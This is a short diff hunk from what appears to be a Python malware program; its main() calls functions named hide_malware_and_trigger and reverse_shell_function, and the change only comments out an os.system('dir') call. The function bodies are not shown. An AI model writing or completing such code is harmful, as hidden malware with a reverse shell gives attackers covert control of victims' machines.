@@ -77,7 +77,7 @@ def main():
     my_returns.append(x.hide_malware_and_trigger())
     if all(res is True for res in my_returns):
         x.reverse_shell_function()
-    os.system('dir')
+    #os.system('dir')
 
 if __name__ == '__main__':
     main()
